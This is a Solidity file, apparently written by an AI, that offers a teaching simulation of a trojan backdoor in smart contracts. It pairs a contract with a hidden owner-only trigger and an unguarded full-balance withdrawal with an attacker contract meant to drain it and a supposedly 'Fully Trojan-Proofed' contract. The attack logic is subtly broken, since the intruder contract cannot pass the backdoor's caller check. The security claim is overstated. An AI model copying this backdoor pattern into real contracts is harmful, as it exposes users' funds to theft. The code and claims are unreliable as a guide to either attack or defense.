// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title TrojanAttackDefense - Full Attack and Defense Simulation for Trojans in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Trojan Contract (Contains Hidden Malicious Functionality)
contract InsecureTrojanContract {
    address public owner;
    address public attacker;
    bool public triggered;

    event SafeAction(address indexed user);
    event HiddenBackdoorActivated(address indexed attacker);

    constructor() {
        owner = msg.sender;
        attacker = msg.sender;
        triggered = false;
    }

    function safeAction() external {
        emit SafeAction(msg.sender);
    }

    function hiddenBackdoor() external {
        require(msg.sender == attacker, "Not attacker");
        triggered = true;
        emit HiddenBackdoorActivated(attacker);
    }

    function withdrawAll(address payable to) external {
        require(triggered, "Not triggered yet");
        (bool sent, ) = to.call{value: address(this).balance}("");
        require(sent, "Withdraw failed");
    }

    receive() external payable {}
}

/// @notice Secure Clean Contract (Fully Trojan-Proofed, No Hidden Functions)
contract SecureAntiTrojanContract {
    address public admin;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);

    mapping(address => uint256) private balances;

    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin");
        _;
    }

    constructor() {
        admin = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Not enough balance");

        balances[msg.sender] -= amount;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Withdraw failed");

        emit Withdraw(msg.sender, amount);
    }

    function getMyBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    receive() external payable {}
}

/// @notice Attack contract triggering hidden Trojan functions
contract TrojanIntruder {
    address public targetTrojan;

    constructor(address _targetTrojan) {
        targetTrojan = _targetTrojan;
    }

    function triggerHiddenBackdoor() external returns (bool success) {
        (success, ) = targetTrojan.call(
            abi.encodeWithSignature("hiddenBackdoor()")
        );
    }

    function drainFunds(address payable attacker) external returns (bool success) {
        (success, ) = targetTrojan.call(
            abi.encodeWithSignature("withdrawAll(address)", attacker)
        );
    }
}
